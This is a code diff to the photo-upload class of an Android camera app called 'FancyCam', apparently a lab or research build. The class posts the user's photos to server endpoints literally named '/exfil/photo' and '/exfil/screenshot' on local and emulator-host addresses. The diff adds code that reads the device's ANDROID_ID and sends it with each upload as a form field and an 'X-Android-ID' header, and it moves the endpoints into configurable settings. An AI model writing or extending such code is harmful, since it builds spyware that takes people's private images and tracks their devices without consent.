@@ -1,5 +1,7 @@
 package com.example.fancycam
 
+import android.content.Context
+import android.provider.Settings
 import android.util.Log
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -16,18 +18,10 @@ object PhotoUploader {
     private const val TAG = "PhotoUploader"
 
     val httpClient: OkHttpClient = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
+        .connectTimeout(12, TimeUnit.SECONDS)
         .writeTimeout(30, TimeUnit.SECONDS)
         .readTimeout(15, TimeUnit.SECONDS)
         .build()
-
-    // Primary (adb reverse mapped) and fallback (Android emulator host alias)
-    val ENDPOINTS = listOf(
-        "http://127.0.0.1:5000/exfil/screenshot",
-        "http://10.0.2.2:5000/exfil/screenshot",
-        "http://127.0.0.1:5000/exfil/photo",
-        "http://10.0.2.2:5000/exfil/photo"
-    )
 
     data class UploadResult(
         val success: Boolean,
@@ -36,20 +30,43 @@ object PhotoUploader {
         val endpointUsed: String = ""
     )
 
-    suspend fun uploadPhoto(file: File): UploadResult = withContext(Dispatchers.IO) {
-        uploadPhotoSync(file)
+    suspend fun uploadPhoto(context: Context? = null, file: File): UploadResult = withContext(Dispatchers.IO) {
+        uploadPhotoSync(context, file)
     }
 
-    fun uploadPhotoSync(file: File): UploadResult {
+    fun uploadPhotoSync(context: Context? = null, file: File): UploadResult {
         if (!file.exists() || file.length() == 0L) {
-            return UploadResult(false, message = "File does not exist or is empty")
+            val res = UploadResult(false, message = "File does not exist or is empty")
+            if (context != null) {
+                AppActivityLogger.logActivity(
+                    context,
+                    type = "UPLOAD_FAIL",
+                    title = "Photo upload failed",
+                    detail = "${file.name}: File missing or empty",
+                    success = false
+                )
+            }
+            return res
+        }
+
+        val endpoints = if (context != null) {
+            AppConfig.getPhotoUploadEndpoints(context)
+        } else {
+            listOf(
+                "http://127.0.0.1:5000/exfil/photo",
+                "http://10.0.2.2:5000/exfil/photo"
+            )
         }
 
         var lastError = "Could not reach server"
 
-        for (endpoint in ENDPOINTS) {
+        for (endpoint in endpoints) {
             try {
                 Log.d(TAG, "Uploading ${file.name} (${file.length()} bytes) to $endpoint")
+
+                val aid = if (context != null) {
+                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
+                } else ""
 
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
@@ -58,13 +75,23 @@ object PhotoUploader {
                         file.name,
                         file.asRequestBody("image/jpeg".toMediaType())
                     )
+                    .apply {
+                        if (aid.isNotEmpty()) {
+                            addFormDataPart("android_id", aid)
+                        }
+                    }
                     .build()
 
-                val request = Request.Builder()
+                val requestBuilder = Request.Builder()
                     .url(endpoint)
                     .post(requestBody)
                     .addHeader("User-Agent", "FancyCam-Android/1.0")
-                    .build()
+
+                if (aid.isNotEmpty()) {
+                    requestBuilder.addHeader("X-Android-ID", aid)
+                }
+
+                val request = requestBuilder.build()
 
                 httpClient.newCall(request).execute().use { response ->
                     if (response.isSuccessful) {
@@ -77,6 +104,17 @@ object PhotoUploader {
                             Log.w(TAG, "Non-JSON response body: $body")
                         }
                         Log.i(TAG, "Photo ${file.name} successfully uploaded to $endpoint as $serverFile")
+
+                        if (context != null) {
+                            AppActivityLogger.logActivity(
+                                context,
+                                type = "UPLOAD_SUCCESS",
+                                title = "Photo uploaded to server",
+                                detail = "${file.name} -> $serverFile ($endpoint)",
+                                success = true
+                            )
+                        }
+
                         return UploadResult(
                             success = true,
                             serverFilename = serverFile,
@@ -92,6 +130,16 @@ object PhotoUploader {
                 lastError = e.localizedMessage ?: "Connection error"
                 Log.w(TAG, "Endpoint $endpoint failed: $lastError")
             }
+        }
+
+        if (context != null) {
+            AppActivityLogger.logActivity(
+                context,
+                type = "UPLOAD_FAIL",
+                title = "Photo upload failed",
+                detail = "${file.name}: $lastError",
+                success = false
+            )
         }
 
         return UploadResult(false, message = lastError)
